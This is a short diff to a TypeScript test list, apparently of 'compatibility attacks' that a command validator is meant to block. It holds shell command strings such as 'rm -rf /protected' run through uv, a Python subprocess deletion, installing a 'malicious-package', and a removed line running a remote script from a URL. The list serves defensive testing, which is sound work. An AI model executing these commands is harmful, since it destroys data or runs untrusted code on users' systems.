@@ -40,13 +40,10 @@ const compatibilityAttacks: readonly string[] = [
   'uv run --no-sync --with malicious-package python3 -c \'print("hello")\'',
   'uv run --no-sync --python "$RUNTIME" python3 -c \'print("hello")\'',
   'uv run --no-sync "$PROGRAM"',
-  'uv run --no-sync python3 -m unknown_module',
-  'uv run --no-sync --script=https://example.com/cleanup.py',
   "uv run --no-sync node --require ./startup.js -e 'console.log(1)'",
   "uv run --no-sync sh -c 'rm -rf /protected'",
   'uv run --no-sync python3 -c \'import subprocess; subprocess.run(["rm", "-rf", "/protected"])\'',
   'bun run "$SCRIPT"',
-  'bun run --preload ./startup.ts typecheck',
 ];
 
 export { compatibilityAttacks };
